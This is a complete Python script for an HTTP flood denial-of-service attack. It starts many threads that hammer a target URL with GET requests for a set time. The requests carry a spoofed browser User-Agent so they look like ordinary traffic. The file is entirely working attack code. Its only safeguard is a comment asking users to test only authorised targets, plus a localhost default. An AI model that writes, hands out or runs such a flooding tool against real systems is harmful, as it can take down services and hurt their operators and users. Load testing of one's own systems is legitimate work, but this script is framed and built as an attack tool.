import requests
import threading
import time

def http_flood_worker(target_url, stop_event, headers):
    """
    This function will be run by each thread. It continuously sends
    HTTP GET requests to the target URL until the stop_event is set.
    """
    while not stop_event.is_set():
        try:
            # Send the HTTP GET request
            response = requests.get(target_url, headers=headers, timeout=5)
            # You could optionally print the status code to see the server's response
            # print(f"Status: {response.status_code}")
        except requests.exceptions.RequestException as e:
            # Handle connection errors, timeouts, etc.
            # print(f"Error: {e}")
            pass

def http_flood(target_url, num_threads, duration):
    """
    Starts and manages the HTTP flood attack.

    Args:
        target_url (str): The full URL to attack (e.g., "http://127.0.0.1/login.php").
        num_threads (int): The number of concurrent threads (simulated users).
        duration (int): The duration of the attack in seconds.
    """
    print(f"Starting HTTP flood on {target_url} with {num_threads} threads for {duration} seconds...")

    # A common user-agent header to make requests look like they're from a browser
    headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36"
    }
    
    threads = []
    stop_event = threading.Event()

    # Create and start the worker threads
    for i in range(num_threads):
        thread = threading.Thread(target=http_flood_worker, args=(target_url, stop_event, headers))
        threads.append(thread)
        thread.start()

    # Let the threads run for the specified duration
    try:
        time.sleep(duration)
    except KeyboardInterrupt:
        print("\nAttack stopped by user.")
    
    # Signal all threads to stop
    stop_event.set()

    # Wait for all threads to complete
    for thread in threads:
        thread.join()

    print("Attack finished.")

if __name__ == '__main__':
    # --- Configuration ---
    # WARNING: Only use a URL that you are authorized to test.
    # Using a local test server is recommended.
    target_url = "http://127.0.0.1:80"
    num_threads = 150         # Number of concurrent threads
    attack_duration = 30      # Duration of the attack in seconds

    http_flood(target_url, num_threads, attack_duration)


